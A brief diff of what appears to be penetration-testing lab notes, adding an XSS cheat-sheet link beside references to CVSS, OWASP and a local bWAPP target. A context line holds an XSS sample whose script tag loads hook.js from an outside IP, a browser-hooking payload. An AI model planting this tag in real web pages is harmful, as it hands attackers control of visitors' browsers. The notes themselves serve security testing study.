@@ -35,5 +35,6 @@ bwapp: http://127.0.0.1:8083
 Links: <br>
 CVSS: https://first.org/cvss/calculator/3.0 <br>
 OWASP: http://owasp.org <br>
+XSS Cheat sheet: http://n0p.net/penguicon/php_app_sec/mirror/xss.html<br>
 
 ``xss sample: asd<script src=///174.138.66.1/hook.js></script>``
